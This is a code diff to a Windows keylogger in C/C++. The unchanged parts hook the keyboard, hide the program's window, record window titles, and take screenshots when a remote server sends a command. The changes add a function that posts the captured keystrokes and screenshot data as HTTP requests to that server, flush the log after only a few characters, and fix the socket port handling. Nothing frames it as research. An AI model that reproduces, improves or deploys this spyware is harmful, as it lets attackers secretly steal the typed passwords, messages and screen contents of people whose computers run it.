@@ -1,16 +1,15 @@
 #include <winsock2.h>
 
 #include <Windows.h>
+#include <process.h>
 #include <stdio.h>
 #include <time.h>
-#include <process.h>
 #include <winsock2.h>
 #include <cstdio>
 #include <fstream>
 #include <iostream>
 
-// defines whether the window is visible or not
-#define BUFFERSIZE 1000
+#define BUFFERSIZE 1024
 
 // variable to store the HANDLE to the hook. Don't declare it anywhere else then
 // globally or you will get problems since every function uses this variable.
@@ -29,10 +28,17 @@ extern char lastwindow[256];
 int ServerConnect(SOCKET &sockfd);
 char KeyMapping(char key);
 void ServerMessage(void *p);
-void ScreenShot(char*BmpName);
+void ScreenShot(char *BmpName);
 void imgTransfer(char *filepath);
 SOCKET sockfd;
-char message[BUFFERSIZE];
+char message[BUFFERSIZE] = {0};
+
+const char *pHttpPost =
+    "POST /put_data HTTP/1.1\r\n"
+    "Host: %s:%d\r\n"
+    "Content-Type: application/x-www-form-urlencoded"
+    "Content-Length: %d\r\n\r\n"
+    "mmmm=%s";
 
 // This is the callback function. Consider it the event that is raised when, in
 // this case, a key is pressed.
@@ -72,6 +78,31 @@ void ReleaseHook()
     UnhookWindowsHookEx(_hook);
 }
 
+void SendHTTP(const char *msg)
+{
+    char strHttpPost[1024] = {0};
+
+    // msg should less than 1024
+    size_t msg_len_len;
+    if (strlen(msg) < 10) {
+        msg_len_len = 1;
+    } else if (strlen(msg) < 100) {
+        msg_len_len = 2;
+    } else if (strlen(msg) < 1000) {
+        msg_len_len = 3;
+    }
+
+    // 4 for port
+    size_t session_len =
+        strlen(pHttpPost) + strlen(SERVER_IP) + 4 + msg_len_len + strlen(msg);
+    snprintf(strHttpPost, session_len, pHttpPost, SERVER_IP, PORT, strlen(msg),
+             msg);
+
+    printf("%s", strHttpPost);
+    send(sockfd, strHttpPost, strlen(strHttpPost), 0);
+    // send(sockfd, pHttpPost, strlen(pHttpPost), 0);
+}
+
 int Save(int key_stroke)
 {
     char lastwindow[256];
@@ -102,11 +133,12 @@ int Save(int key_stroke)
             strftime(s, sizeof(s), "%c", tm);
 
 
-            strcat(message, "[Window: ");
-            strcat(message, window_title);
-            strcat(message, " - at ");
+            // strcat(message, "[Window: ");
+            // strcat(message, window_title);
+            // strcat(message, " - at ");
+            strcat(message, "window_title  ");
             strcat(message, s);
-            strcat(message, "]\n\n");
+            // strcat(message, "]\n\n");
         }
     }
 
@@ -123,7 +155,7 @@ int Save(int key_stroke)
         strcat(message, "\t");
     } else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT ||
                key_stroke == VK_RSHIFT) {
-        //strcat(message, "[###SHIFT]");
+        // strcat(message, "[###SHIFT]");
     } else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL ||
                key_stroke == VK_RCONTROL) {
         strcat(message, "[###CTRL]");
@@ -146,7 +178,7 @@ int Save(int key_stroke)
     } else if (key_stroke == 189 || key_stroke == 109) {
         strcat(message, "-");
     } else if (key_stroke == 20) {
-        //strcat(message, "[###CAPSLOCK]");
+        // strcat(message, "[###CAPSLOCK]");
     } else {
         char key;
         // check caps lock
@@ -163,13 +195,12 @@ int Save(int key_stroke)
         key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
 
         // tolower converts it to lowercase properly
-        if (!lowercase){
+        if (!lowercase) {
             //沒按Shift
-            if(key >= 65 && key <= 90){
+            if (key >= 65 && key <= 90) {
                 key = tolower(key);
             }
-        }
-        else {
+        } else {
             //有按Shift
             key = KeyMapping(key);
         }
@@ -179,8 +210,11 @@ int Save(int key_stroke)
         strcat(message, buf);
     }
 
-    if(strlen(message) > BUFFERSIZE - 50){
-        send(sockfd, message, BUFFERSIZE, 0);
+    // if (strlen(message) > BUFFERSIZE - 50) {
+    printf("len: %d\n", strlen(message));
+    if (strlen(message) > 10) {
+        // send(sockfd, message, BUFFERSIZE, 0);
+        SendHTTP(message);
         strcpy(message, "");
     }
 
@@ -188,33 +222,17 @@ int Save(int key_stroke)
     return 0;
 }
 
-char KeyMapping(char key){
-    char keymap[20][2] = {
-        {'`', '~'},
-        {'1', '!'},
-        {'2', '@'},
-        {'3', '#'},
-        {'4', '$'},
-        {'5', '%'},
-        {'6', '^'},
-        {'7', '&'},
-        {'8', '*'},
-        {'9', '('},
-        {'0', ')'},
-        {'-', '_'},
-        {'=', '+'},
-        {'[', '{'},
-        {'\\', '|'},
-        {';', ':'},
-        {'\'', '"'},
-        {',', '<'},
-        {'.', '>'},
-        {'/', '?'}
-    };
+char KeyMapping(char key)
+{
+    char keymap[20][2] = {{'`', '~'},  {'1', '!'}, {'2', '@'},  {'3', '#'},
+                          {'4', '$'},  {'5', '%'}, {'6', '^'},  {'7', '&'},
+                          {'8', '*'},  {'9', '('}, {'0', ')'},  {'-', '_'},
+                          {'=', '+'},  {'[', '{'}, {'\\', '|'}, {';', ':'},
+                          {'\'', '"'}, {',', '<'}, {'.', '>'},  {'/', '?'}};
 
 
-    for(int i = 0; i < 20; i++){
-        if(key == keymap[i][0]){
+    for (int i = 0; i < 20; i++) {
+        if (key == keymap[i][0]) {
             return keymap[i][1];
         }
     }
@@ -242,7 +260,7 @@ int ServerConnect(SOCKET &sockfd)
 
     address.sin_family = AF_INET;
     address.sin_addr.s_addr = inet_addr(SERVER_IP);
-    address.sin_port = PORT;
+    address.sin_port = htons(PORT);
     len = sizeof(address);
 
     if (WSAStartup(0x101, (LPWSADATA) &wsadata) != 0) {
@@ -261,22 +279,25 @@ int ServerConnect(SOCKET &sockfd)
     }
 }
 
-void ScreenShot(char*BmpName)
+void ScreenShot(char *BmpName)
 {
     HWND DesktopHwnd = GetDesktopWindow();
     HDC DevC = GetDC(DesktopHwnd);
     int Width = ::GetSystemMetrics(SM_CXSCREEN);
     int Height = ::GetSystemMetrics(SM_CYSCREEN);
 
-    DWORD FileSize = sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER)+(sizeof(RGBTRIPLE)+1*(Width*Height*4));
-    char *BmpFileData = (char*)GlobalAlloc(0x0040,FileSize);
+    DWORD FileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) +
+                     (sizeof(RGBTRIPLE) + 1 * (Width * Height * 4));
+    char *BmpFileData = (char *) GlobalAlloc(0x0040, FileSize);
 
-    PBITMAPFILEHEADER BFileHeader = (PBITMAPFILEHEADER)BmpFileData;
-    PBITMAPINFOHEADER  BInfoHeader = (PBITMAPINFOHEADER)&BmpFileData[sizeof(BITMAPFILEHEADER)];
+    PBITMAPFILEHEADER BFileHeader = (PBITMAPFILEHEADER) BmpFileData;
+    PBITMAPINFOHEADER BInfoHeader =
+        (PBITMAPINFOHEADER) &BmpFileData[sizeof(BITMAPFILEHEADER)];
 
-    BFileHeader->bfType = 0x4D42; // BM
+    BFileHeader->bfType = 0x4D42;  // BM
     BFileHeader->bfSize = sizeof(BITMAPFILEHEADER);
-    BFileHeader->bfOffBits = sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER);
+    BFileHeader->bfOffBits =
+        sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
 
     BInfoHeader->biSize = sizeof(BITMAPINFOHEADER);
     BInfoHeader->biPlanes = 1;
@@ -285,45 +306,49 @@ void ScreenShot(char*BmpName)
     BInfoHeader->biHeight = Height;
     BInfoHeader->biWidth = Width;
 
-    RGBTRIPLE *Image = (RGBTRIPLE*)&BmpFileData[sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER)];
+    RGBTRIPLE *Image = (RGBTRIPLE *) &BmpFileData[sizeof(BITMAPFILEHEADER) +
+                                                  sizeof(BITMAPINFOHEADER)];
     RGBTRIPLE color;
 
-    HDC     CaptureDC       = CreateCompatibleDC(DevC);
-    HBITMAP CaptureBitmap   = CreateCompatibleBitmap(DevC,Width,Height);
-    SelectObject(CaptureDC,CaptureBitmap);
-    BitBlt(CaptureDC,0,0,Width,Height,DevC,0,0,SRCCOPY|CAPTUREBLT);
-    GetDIBits(CaptureDC,CaptureBitmap,0,Height,Image,(LPBITMAPINFO)BInfoHeader, DIB_RGB_COLORS);
+    HDC CaptureDC = CreateCompatibleDC(DevC);
+    HBITMAP CaptureBitmap = CreateCompatibleBitmap(DevC, Width, Height);
+    SelectObject(CaptureDC, CaptureBitmap);
+    BitBlt(CaptureDC, 0, 0, Width, Height, DevC, 0, 0, SRCCOPY | CAPTUREBLT);
+    GetDIBits(CaptureDC, CaptureBitmap, 0, Height, Image,
+              (LPBITMAPINFO) BInfoHeader, DIB_RGB_COLORS);
 
     DWORD Junk;
-    HANDLE FH = CreateFileA(BmpName,GENERIC_WRITE,FILE_SHARE_WRITE,0,CREATE_ALWAYS,0,0);
-    WriteFile(FH,BmpFileData,FileSize,&Junk,0);
+    HANDLE FH = CreateFileA(BmpName, GENERIC_WRITE, FILE_SHARE_WRITE, 0,
+                            CREATE_ALWAYS, 0, 0);
+    WriteFile(FH, BmpFileData, FileSize, &Junk, 0);
     CloseHandle(FH);
     GlobalFree(BmpFileData);
 }
 
-void ServerMessage(void *p){
+void ServerMessage(void *p)
+{
     int rVal;
     char buf[BUFFERSIZE + 1];
 
     while ((rVal = recv(sockfd, buf, BUFFERSIZE, 0)) > 0) {
         buf[rVal] = 0x00;
-        if(strcmp(buf, "#get") == 0){
-            send(sockfd, message, BUFFERSIZE, 0);
+        if (strcmp(buf, "#get") == 0) {
+            SendHTTP(message);
             strcpy(message, "");
-        } else if(strcmp(buf, "#screenshot") == 0){
+        } else if (strcmp(buf, "#screenshot") == 0) {
             char filename[40] = "C:\\Users\\Public\\Pictures\\Hello.bmp";
             ScreenShot(filename);
             imgTransfer(filename);
             int status = DeleteFile(filename);
 
-            //do something here
+            // do something here
         }
     }
 }
 
 void imgTransfer(char *filepath)
 {
-    send(sockfd, "#screenshot", BUFFERSIZE, 0);
+    SendHTTP("#screenshot");
     int ret;
     FILE *ptrFile;
     ptrFile = fopen(filepath, "rb");
@@ -331,24 +356,28 @@ void imgTransfer(char *filepath)
     char send_buf[FILEBLOCKSIZE];
     ret = fread(send_buf, sizeof(char), FILEBLOCKSIZE, ptrFile);
     while (ret == FILEBLOCKSIZE) {
-        send(sockfd, send_buf, ret, 0);
+        SendHTTP(send_buf);
         ret = fread(send_buf, sizeof(char), FILEBLOCKSIZE, ptrFile);
     }
-    send(sockfd, send_buf, ret, 0);
-    send(sockfd, "#END", FILEBLOCKSIZE, 0);
+    // send(sockfd, send_buf, ret, 0);
+    SendHTTP(send_buf);
+    // send(sockfd, "#END", FILEBLOCKSIZE, 0);
+    SendHTTP("#END");
     fclose(ptrFile);
 }
 
 int main()
 {
     // open output file in append mode
-    //OUTPUT_FILE.open(".System32Log.txt", std::ios_base::app);
+    // OUTPUT_FILE.open(".System32Log.txt", std::ios_base::app);
 
     // visibility of window
     Stealth();
 
     // Connect to server
-    ServerConnect(sockfd);
+    if (ServerConnect(sockfd) < 0) {
+        exit(1);
+    }
 
     // Get message from Server
     _beginthread(ServerMessage, 0, NULL);
